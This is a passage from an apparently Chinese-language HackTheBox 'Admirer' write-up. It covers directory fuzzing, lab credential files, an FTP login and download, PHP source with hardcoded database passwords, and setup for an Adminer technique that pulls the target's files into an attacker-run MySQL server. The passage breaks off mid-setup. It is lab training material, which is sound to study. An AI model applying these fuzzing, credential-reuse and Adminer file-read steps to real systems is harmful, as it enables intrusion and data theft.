class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000015592:   200        29 L     39 W     350 Ch      &quot;contacts - txt&quot;</span><br><span class="line">000016327:   200        11 L     13 W     136 Ch      &quot;credentials - txt&quot;</span><br><span class="line"></span><br><span class="line">Total time: 247.8061</span><br><span class="line">Processed Requests: 61419</span><br><span class="line">Filtered Requests: 61417</span><br><span class="line">Requests&#x2F;sec.: 247.8509</span><br></pre></td></tr></table></figure>
+<p>contact.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">##########</span><br><span class="line"># admins #</span><br><span class="line">##########</span><br><span class="line"># Penny</span><br><span class="line">Email: p.wise@admirer.htb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##############</span><br><span class="line"># developers #</span><br><span class="line">##############</span><br><span class="line"># Rajesh</span><br><span class="line">Email: r.nayyar@admirer.htb</span><br><span class="line"></span><br><span class="line"># Amy</span><br><span class="line">Email: a.bialik@admirer.htb</span><br><span class="line"></span><br><span class="line"># Leonard</span><br><span class="line">Email: l.galecki@admirer.htb</span><br></pre></td></tr></table></figure>
+<p>credential.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Bank Account]</span><br><span class="line">waldo.11</span><br><span class="line">Ezy]m27&#125;OREc$</span><br><span class="line"></span><br><span class="line">[Internal mail account]</span><br><span class="line">w.cooper@admirer.htb</span><br><span class="line">fgJr6q#S\W:$P</span><br><span class="line"></span><br><span class="line">[FTP account]</span><br><span class="line">ftpuser</span><br><span class="line">%n?4Wz&#125;R$tTF7</span><br><span class="line"></span><br><span class="line">[Wordpress account]</span><br><span class="line">admin</span><br><span class="line">w0rdpr3ss01!</span><br></pre></td></tr></table></figure>
+<p>用FTP account登录FTP服务器：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.187</span><br><span class="line">Connected to admirer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (10.10.10.187:kali): ftpuser</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">dump.sql</span><br><span class="line">html.tar.gz</span><br><span class="line">ftp&gt; get dump.sql</span><br><span class="line">ftp&gt; get html.tar.gz</span><br></pre></td></tr></table></figure>
+<p>dump.sql</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">-- MySQL dump 10.16  Distrib 10.1.41-MariaDB, for debian-linux-gnu (x86_64)</span><br><span class="line">--</span><br><span class="line">-- Host: localhost    Database: admirerdb</span><br><span class="line">-- ------------------------------------------------------</span><br><span class="line">-- Server version	10.1.41-MariaDB-0+deb9u1</span><br><span class="line"></span><br><span class="line">&#x2F;*!40101 SET @OLD_CHARACTER_SET_CLIENT&#x3D;@@CHARACTER_SET_CLIENT *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET @OLD_CHARACTER_SET_RESULTS&#x3D;@@CHARACTER_SET_RESULTS *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET @OLD_COLLATION_CONNECTION&#x3D;@@COLLATION_CONNECTION *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET NAMES utf8mb4 *&#x2F;;</span><br><span class="line">&#x2F;*!40103 SET @OLD_TIME_ZONE&#x3D;@@TIME_ZONE *&#x2F;;</span><br><span class="line">&#x2F;*!40103 SET TIME_ZONE&#x3D;&#39;+00:00&#39; *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET @OLD_UNIQUE_CHECKS&#x3D;@@UNIQUE_CHECKS, UNIQUE_CHECKS&#x3D;0 *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET @OLD_FOREIGN_KEY_CHECKS&#x3D;@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS&#x3D;0 *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET @OLD_SQL_MODE&#x3D;@@SQL_MODE, SQL_MODE&#x3D;&#39;NO_AUTO_VALUE_ON_ZERO&#39; *&#x2F;;</span><br><span class="line">&#x2F;*!40111 SET @OLD_SQL_NOTES&#x3D;@@SQL_NOTES, SQL_NOTES&#x3D;0 *&#x2F;;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Table structure for table &#96;items&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">DROP TABLE IF EXISTS &#96;items&#96;;</span><br><span class="line">&#x2F;*!40101 SET @saved_cs_client     &#x3D; @@character_set_client *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET character_set_client &#x3D; utf8 *&#x2F;;</span><br><span class="line">CREATE TABLE &#96;items&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT,</span><br><span class="line">  &#96;thumb_path&#96; text NOT NULL,</span><br><span class="line">  &#96;image_path&#96; text NOT NULL,</span><br><span class="line">  &#96;title&#96; text NOT NULL,</span><br><span class="line">  &#96;text&#96; text,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;13 DEFAULT CHARSET&#x3D;utf8mb4;</span><br><span class="line">&#x2F;*!40101 SET character_set_client &#x3D; @saved_cs_client *&#x2F;;</span><br><span class="line"></span><br><span class="line">--</span><br><span class="line">-- Dumping data for table &#96;items&#96;</span><br><span class="line">--</span><br><span class="line"></span><br><span class="line">LOCK TABLES &#96;items&#96; WRITE;</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;items&#96; DISABLE KEYS *&#x2F;;</span><br><span class="line">INSERT INTO &#96;items&#96; VALUES (1,&#39;images&#x2F;thumbs&#x2F;thmb_art01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;art01.jpg&#39;,&#39;Visual Art&#39;,&#39;A pure showcase of skill and emotion.&#39;),(2,&#39;images&#x2F;thumbs&#x2F;thmb_eng02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng02.jpg&#39;,&#39;The Beauty and the Beast&#39;,&#39;Besides the technology, there is also the eye candy...&#39;),(3,&#39;images&#x2F;thumbs&#x2F;thmb_nat01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;nat01.jpg&#39;,&#39;The uncontrollable lightshow&#39;,&#39;When the sun decides to play at night.&#39;),(4,&#39;images&#x2F;thumbs&#x2F;thmb_arch02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch02.jpg&#39;,&#39;Nearly Monochromatic&#39;,&#39;One could simply spend hours looking at this indoor square.&#39;),(5,&#39;images&#x2F;thumbs&#x2F;thmb_mind01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind01.jpg&#39;,&#39;Way ahead of his time&#39;,&#39;You probably still use some of his inventions... 500yrs later.&#39;),(6,&#39;images&#x2F;thumbs&#x2F;thmb_mus02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus02.jpg&#39;,&#39;The outcomes of complexity&#39;,&#39;Seriously, listen to Dust in Interstellar\&#39;s OST. Thank me later.&#39;),(7,&#39;images&#x2F;thumbs&#x2F;thmb_arch01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;arch01.jpg&#39;,&#39;Back to basics&#39;,&#39;And centuries later, we want to go back and live in nature... Sort of.&#39;),(8,&#39;images&#x2F;thumbs&#x2F;thmb_mind02.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mind02.jpg&#39;,&#39;We need him back&#39;,&#39;He might have been a loner who allegedly slept with a pigeon, but that brain...&#39;),(9,&#39;images&#x2F;thumbs&#x2F;thmb_eng01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;eng01.jpg&#39;,&#39;In the name of Science&#39;,&#39;Some theories need to be proven.&#39;),(10,&#39;images&#x2F;thumbs&#x2F;thmb_mus01.jpg&#39;,&#39;images&#x2F;fulls&#x2F;mus01.jpg&#39;,&#39;Equal Temperament&#39;,&#39;Because without him, music would not exist (as we know it today).&#39;);</span><br><span class="line">&#x2F;*!40000 ALTER TABLE &#96;items&#96; ENABLE KEYS *&#x2F;;</span><br><span class="line">UNLOCK TABLES;</span><br><span class="line">&#x2F;*!40103 SET TIME_ZONE&#x3D;@OLD_TIME_ZONE *&#x2F;;</span><br><span class="line"></span><br><span class="line">&#x2F;*!40101 SET SQL_MODE&#x3D;@OLD_SQL_MODE *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET FOREIGN_KEY_CHECKS&#x3D;@OLD_FOREIGN_KEY_CHECKS *&#x2F;;</span><br><span class="line">&#x2F;*!40014 SET UNIQUE_CHECKS&#x3D;@OLD_UNIQUE_CHECKS *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET CHARACTER_SET_CLIENT&#x3D;@OLD_CHARACTER_SET_CLIENT *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET CHARACTER_SET_RESULTS&#x3D;@OLD_CHARACTER_SET_RESULTS *&#x2F;;</span><br><span class="line">&#x2F;*!40101 SET COLLATION_CONNECTION&#x3D;@OLD_COLLATION_CONNECTION *&#x2F;;</span><br><span class="line">&#x2F;*!40111 SET SQL_NOTES&#x3D;@OLD_SQL_NOTES *&#x2F;;</span><br><span class="line"></span><br><span class="line">-- Dump completed on 2019-12-02 20:24:15</span><br></pre></td></tr></table></figure>
+<p>解压html.tar.gz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html [12:51:51] </span><br><span class="line">$ ls -l</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 6 kali kali 4096 6月   7  2019 assets</span><br><span class="line">drwxr-x--- 4 kali kali 4096 12月  3 04:29 images</span><br><span class="line">-rw-r----- 1 kali kali 4613 12月  4 04:20 index.php</span><br><span class="line">-rw-r----- 1 kali kali  134 12月  2 05:31 robots.txt</span><br><span class="line">drwxr-x--- 2 kali kali 4096 12月  3 01:50 utility-scripts</span><br><span class="line">drwxr-x--- 2 kali kali 4096 12月  3 01:25 w4ld0s_s3cr3t_d1r</span><br></pre></td></tr></table></figure>
+<p>utility-scripts目录下的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:54] </span><br><span class="line">$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxr-x--- 2 kali kali 4096 12月  3 01:50 .</span><br><span class="line">drwx------ 6 kali kali 4096 5月  20 14:29 ..</span><br><span class="line">-rw-r----- 1 kali kali 1795 12月  3 01:48 admin_tasks.php</span><br><span class="line">-rw-r----- 1 kali kali  401 12月  2 06:28 db_admin.php</span><br><span class="line">-rw-r----- 1 kali kali   20 11月 30 03:32 info.php</span><br><span class="line">-rw-r----- 1 kali kali   53 12月  3 01:40 phptest.php</span><br></pre></td></tr></table></figure>
+<p>admin_tasks.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Administrative Tasks&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h3&gt;Admin Tasks Web Interface (v0.01 beta)&lt;/h3&gt;</span><br><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// Web Interface to the admin_tasks script</span></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;task&#x27;</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    $task = $_REQUEST[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>($task == <span class="string">&#x27;1&#x27;</span> || $task == <span class="string">&#x27;2&#x27;</span> || $task == <span class="string">&#x27;3&#x27;</span> || $task == <span class="string">&#x27;4&#x27;</span> ||</span><br><span class="line">       $task == <span class="string">&#x27;5&#x27;</span> || $task == <span class="string">&#x27;6&#x27;</span> || $task == <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*********************************************************************************** </span></span><br><span class="line"><span class="comment">         Available options:</span></span><br><span class="line"><span class="comment">           1) View system uptime</span></span><br><span class="line"><span class="comment">           2) View logged in users</span></span><br><span class="line"><span class="comment">           3) View crontab (current user only)</span></span><br><span class="line"><span class="comment">           4) Backup passwd file (not working)</span></span><br><span class="line"><span class="comment">           5) Backup shadow file (not working)</span></span><br><span class="line"><span class="comment">           6) Backup web data (not working)</span></span><br><span class="line"><span class="comment">           7) Backup database (not working)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">           <span class="doctag">NOTE:</span> Options 4-7 are currently NOT working because they need root privileges.</span></span><br><span class="line"><span class="comment">                 I&#x27;m leaving them in the valid tasks in case I figure out a way</span></span><br><span class="line"><span class="comment">                 to securely run code as root from a PHP page.</span></span><br><span class="line"><span class="comment">      ************************************************************************************/</span></span><br><span class="line">      <span class="keyword">echo</span> str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&lt;br /&gt;&quot;</span>, shell_exec(<span class="string">&quot;/opt/scripts/admin_tasks.sh <span class="subst">$task</span> 2&gt;&amp;1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="string">&quot;Invalid task.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;p&gt;</span><br><span class="line">  &lt;h4&gt;Select task:&lt;/p&gt;</span><br><span class="line">  &lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;select name=<span class="string">&quot;task&quot;</span>&gt;</span><br><span class="line">      &lt;option value=<span class="number">1</span>&gt;View system uptime&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">2</span>&gt;View logged in users&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">3</span>&gt;View crontab&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">4</span> disabled&gt;Backup passwd file&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">5</span> disabled&gt;Backup shadow file&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">6</span> disabled&gt;Backup web data&lt;/option&gt;</span><br><span class="line">      &lt;option value=<span class="number">7</span> disabled&gt;Backup database&lt;/option&gt;</span><br><span class="line">    &lt;/select&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>db_admin.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $servername = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">  $username = <span class="string">&quot;waldo&quot;</span>;</span><br><span class="line">  $password = <span class="string">&quot;Wh3r3_1s_w4ld0?&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create connection</span></span><br><span class="line">  $conn = <span class="keyword">new</span> mysqli($servername, $username, $password);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check connection</span></span><br><span class="line">  <span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . $conn-&gt;connect_error);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Connected successfully&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> Finish implementing this or find a better open source alternative</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>info.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>phptest.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span>(<span class="string">&quot;Just a test to see if PHP works.&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>暴露了一个数据库的用户名和密码。但是后面的注释提示<code>a better open source alternative</code>，用wfuzz扫描该目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Admirer&#x2F;html&#x2F;utility-scripts [12:53:55] </span><br><span class="line">$ wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -z list,php-txt-html --hc 403,404 -t 100 -u http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2Z</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.187&#x2F;utility-scripts&#x2F;FUZZ.FUZ2Z</span><br><span class="line">Total requests: 61419</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000005617:   200        51 L     235 W    4156 Ch     &quot;adminer - php&quot;</span><br><span class="line">000028852:   200        964 L    4976 W   84023 Ch    &quot;info - php&quot;</span><br><span class="line">000041602:   200        0 L      8 W      32 Ch       &quot;phptest - php&quot;</span><br><span class="line"></span><br><span class="line">Total time: 266.5721</span><br><span class="line">Processed Requests: 61419</span><br><span class="line">Filtered Requests: 61416</span><br><span class="line">Requests&#x2F;sec.: 230.4028</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://10.10.10.178/utility-scripts/adminer.php</code></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200521131354.png" alt=""></p>
+<h3 id="Getting-User-Access">Getting User Access</h3>
+<p>用之前得到的用户名和密码尝试登录失败，Google <code>Adminer database manager</code>，得到一种利用方式：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">Serious Vulnerability Discovered in Adminer database Administration Tool</a></p>
+</blockquote>
+<p>简单来讲就是，先配置本地的MySQL数据库，允许远程连接登录，然后用靶机上的adminer database manager连接我们本地的数据库，再将靶机的敏感文件通过adminer写入数据库，最后从本地读取敏感文件。</p>
+<p>在kali上用root登录MySQL，新建一个数据库：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; CREATE DATABASE admirer;</span><br></pre></td></tr></table></figure>
+<p>创建一个用户，如果想让该用户可以<strong>从任意远程主机登陆</strong>，可以使用通配符<code>%</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; CREATE USER &#39;demo&#39;@&#39;%&#39; IDENTIFIED BY &#39;demo_admirer&#39;;</span><br></pre></td></tr></table></figure>
+<p>给新用户授权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; GRANT ALL PRIVILEGES ON * . * TO <span class="string">&#x27;demo&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>重新加载权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>
+<p>创建新数据表<code>test</code>：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(admirer)]&gt; create table test(data VARCHAR(255));</span><br></pre></td></tr></table></figure>
+<p>配置数据库使得能远程连接，修改<code>/etc/mysql/mariadb.conf.d/50-server.cnf</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind-address      &#x3D;0.0.0.0</span><br></pre></td></tr></table></figure>
+<p>重启MySQL服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart mysql</span><br></pre></td></tr></table></figure>
+<p>在本地验证能否登录：</p>
